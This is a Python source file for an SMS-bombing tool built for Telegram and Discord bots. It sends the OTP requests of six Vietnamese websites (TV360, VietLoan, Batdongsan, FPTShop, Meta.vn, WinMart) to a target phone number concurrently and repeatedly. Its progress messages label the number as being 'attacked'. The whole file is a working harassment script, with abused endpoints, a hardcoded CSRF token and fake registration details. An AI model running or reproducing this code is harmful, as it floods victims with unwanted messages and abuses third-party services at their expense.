import asyncio
import concurrent.futures
import requests
import time


class SMSSpammer:

    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.error_logs = []

    def send_request(self, func, phone):
        try:
            func(phone)
            self.success_count += 1
            return True
        except Exception as e:
            self.fail_count += 1
            error_message = f"Lỗi khi gọi {func.__name__}: {str(e)}"
            self.error_logs.append(error_message)
            return False

    def tv360(self, phone):
        try:
            data = '{"msisdn":"' + phone + '"}'
            headers = {
                "Host": "m.tv360.vn",
                "accept": "application/json, text/plain, */*",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
                "content-type": "application/json"
            }
            response = requests.post(
                "https://m.tv360.vn/public/v1/auth/get-otp-login",
                data=data,
                headers=headers)
            return response.status_code == 200
        except Exception as e:
            raise Exception(f"TV360 request failed: {str(e)}")

    def robot(self, phone):
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'vi,vi-VN;q=0.9',
                'content-type':
                'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://vietloan.vn',
                'referer': 'https://vietloan.vn/register',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'phone': phone,
                '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
            }
            response = requests.post(
                'https://vietloan.vn/register/phone-resend',
                headers=headers,
                data=data)
            return response.status_code == 200
        except Exception as e:
            raise Exception(f"Robot request failed: {str(e)}")

    def fb(self, phone):
        try:
            params = {
                'phoneNumber': phone,
            }
            headers = {
                'accept':
                'application/json, text/plain, */*',
                'accept-language':
                'vi,vi-VN;q=0.9',
                'referer':
                'https://batdongsan.com.vn/sellernet/internal-sign-up',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            }
            response = requests.get(
                'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
                params=params,
                headers=headers,
            )
            return response.status_code == 200
        except Exception as e:
            raise Exception(f"FB request failed: {str(e)}")

    def fptshop(self, phone):
        try:
            headers = {
                'accept':
                '*/*',
                'accept-language':
                'vi,vi-VN;q=0.9',
                'apptenantid':
                'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
                'content-type':
                'application/json',
                'origin':
                'https://fptshop.com.vn',
                'referer':
                'https://fptshop.com.vn/',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            }
            json_data = {
                'fromSys': 'WEBKHICT',
                'otpType': '0',
                'phoneNumber': phone,
            }
            response = requests.post(
                'https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
                headers=headers,
                json=json_data)
            return response.status_code == 200
        except Exception as e:
            raise Exception(f"FPTShop request failed: {str(e)}")

    def meta(self, phone):
        try:
            headers = {
                'accept':
                'application/json, text/plain, */*',
                'accept-language':
                'vi,vi-VN;q=0.9',
                'content-type':
                'application/json',
                'origin':
                'https://meta.vn',
                'referer':
                'https://meta.vn/account/register',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            }
            params = {
                'api_mode': '1',
            }
            json_data = {
                'api_args': {
                    'lgUser': phone,
                    'type': 'phone',
                },
                'api_method': 'CheckRegister',
            }
            response = requests.post(
                'https://meta.vn/app_scripts/pages/AccountReact.aspx',
                params=params,
                headers=headers,
                json=json_data,
            )
            return response.status_code == 200
        except Exception as e:
            raise Exception(f"Meta request failed: {str(e)}")

    def winmart(self, phone):
        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'vi,vi-VN;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://winmart.vn',
                'referer': 'https://winmart.vn/',
                'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-api-merchant': 'WCM',
            }
            json_data = {
                'firstName': 'Taylor Jasmine',
                'phoneNumber': phone,
                'masanReferralCode': '',
                'dobDate': '2005-08-05',
                'gender': 'Male',
            }
            response = requests.post(
                'https://api-crownx.winmart.vn/iam/api/v1/user/register',
                headers=headers,
                json=json_data)
            return response.status_code == 200
        except Exception as e:
            raise Exception(f"Winmart request failed: {str(e)}")

    def run_spam(self,
                 phone,
                 count,
                 update=None,
                 context=None,
                 progress_msg=None,
                 user_name=None):
        functions = [
            self.tv360, self.robot, self.fb, self.fptshop, self.meta,
            self.winmart
        ]

        results = []
        overall_success = False  # Biến để theo dõi thành công tổng thể

        for i in range(1, count + 1):
            self.success_count = 0
            self.fail_count = 0
            self.error_logs = []

            # Hiển thị thông báo đang thực hiện
            message = f"┌──────⭓ Clow_Ponkey\n│ Spam: Đang thực hiện\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count} (lần {i}/{count})\n│ Đang Tấn Công: {phone}\n└─────────────"

            if progress_msg:
                try:
                    progress_msg.edit_text(message)
                except Exception:
                    pass

            # Thực hiện spam
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=10) as executor:
                futures = {
                    executor.submit(self.send_request, fn, phone): fn.__name__
                    for fn in functions
                }
                for future in concurrent.futures.as_completed(futures):
                    fn_name = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        self.error_logs.append(f"{fn_name}: {str(e)}")

            # Kiểm tra kết quả
            if self.success_count > 0:
                overall_success = True
                status_text = "Thành Công"
            else:
                status_text = "Thất Bại"

            # Cập nhật thông báo với kết quả
            message = f"┌──────⭓ Clow_Ponkey\n│ Spam: {status_text}\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count} (lần {i}/{count})\n│ Đang Tấn Công: {phone}\n└─────────────"

            results.append(message)

            if progress_msg:
                try:
                    if i == count:
                        # Hiển thị kết quả cuối cùng
                        final_status = "Thành Công" if overall_success else "Thất Bại"
                        final_message = f"┌──────⭓ Clow_Ponkey\n│ Spam: {final_status}\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count}\n│ Đang Tấn Công: {phone}\n└─────────────"
                        progress_msg.edit_text(final_message)
                    else:
                        # Hiển thị thông báo đang chuẩn bị cho lần tiếp theo
                        progress_msg.edit_text(
                            message + "\n⏳ Đang chuẩn bị cho lần tiếp theo...")
                        time.sleep(3)  # Đợi 3 giây giữa các lần spam
                except Exception:
                    pass

        # Trả về kết quả cuối cùng
        final_status = "Thành Công" if overall_success else "Thất Bại"
        final_message = f"┌──────⭓ Clow_Ponkey\n│ Spam: {final_status}\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count}\n│ Đang Tấn Công: {phone}\n└─────────────"
        results.append(final_message)

        return results

    async def run_spam_async(self, phone, count, user_name, progress_msg=None):
        """Phiên bản async cho Discord"""
        functions = [
            self.tv360, self.robot, self.fb, self.fptshop, self.meta,
            self.winmart
        ]

        results = []
        overall_success = False

        for i in range(1, count + 1):
            self.success_count = 0
            self.fail_count = 0
            self.error_logs = []

            # Hiển thị thông báo đang thực hiện
            message = f"┌──────⭓ Clow_Ponkey\n│ Spam: Đang thực hiện\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count} (lần {i}/{count})\n│ Đang Tấn Công: {phone}\n└─────────────"

            if progress_msg:
                try:
                    await progress_msg.edit(content=message)
                except Exception:
                    pass

            # Thực hiện các cuộc gọi API trong một thread riêng
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=10) as executor:
                loop = asyncio.get_event_loop()
                futures = []

                for fn in functions:
                    future = loop.run_in_executor(executor, self.send_request,
                                                  fn, phone)
                    futures.append(future)

                # Đợi tất cả các futures hoàn thành
                await asyncio.gather(*futures)

            # Kiểm tra kết quả
            if self.success_count > 0:
                overall_success = True
                status_text = "Thành Công"
            else:
                status_text = "Thất Bại"

            # Cập nhật thông báo với kết quả
            message = f"┌──────⭓ Clow_Ponkey\n│ Spam: {status_text}\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count} (lần {i}/{count})\n│ Đang Tấn Công: {phone}\n└─────────────"

            if progress_msg:
                try:
                    if i == count:
                        # Hiển thị kết quả cuối cùng
                        final_status = "Thành Công" if overall_success else "Thất Bại"
                        final_message = f"┌──────⭓ Clow_Ponkey\n│ Spam: {final_status}\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count}\n│ Đang Tấn Công: {phone}\n└─────────────"
                        await progress_msg.edit(content=final_message)
                    else:
                        # Hiển thị thông báo đang chuẩn bị cho lần tiếp theo
                        await progress_msg.edit(
                            content=message +
                            "\n⏳ Đang chuẩn bị cho lần tiếp theo...")
                        await asyncio.sleep(3)  # Đợi 3 giây giữa các lần spam
                except Exception:
                    pass

        # Trả về kết quả cuối cùng
        final_status = "Thành Công" if overall_success else "Thất Bại"
        final_message = f"┌──────⭓ Clow_Ponkey\n│ Spam: {final_status}\n│ Người dùng: {user_name}\n│ Số Lần Spam: {count}\n│ Đang Tấn Công: {phone}\n└─────────────"
        results.append(final_message)

        return results

    def run_spam_simple(self, phone, count):
        """Thực hiện spam và trả về kết quả đơn giản (thành công/thất bại)"""
        functions = [
            self.tv360, self.robot, self.fb, self.fptshop, self.meta,
            self.winmart
        ]

        success_overall = False

        try:
            for i in range(1, count + 1):
                self.success_count = 0
                self.fail_count = 0

                with concurrent.futures.ThreadPoolExecutor(
                        max_workers=10) as executor:
                    futures = {
                        executor.submit(self.send_request, fn, phone):
                        fn.__name__
                        for fn in functions
                    }
                    for future in concurrent.futures.as_completed(futures):
                        try:
                            future.result()
                        except Exception:
                            pass

                # Nếu có ít nhất một request thành công, coi như spam thành công
                if self.success_count > 0:
                    success_overall = True

                # Đợi một chút giữa các lần spam
                if i < count:
                    time.sleep(3)

            return success_overall
        except Exception:
            return False
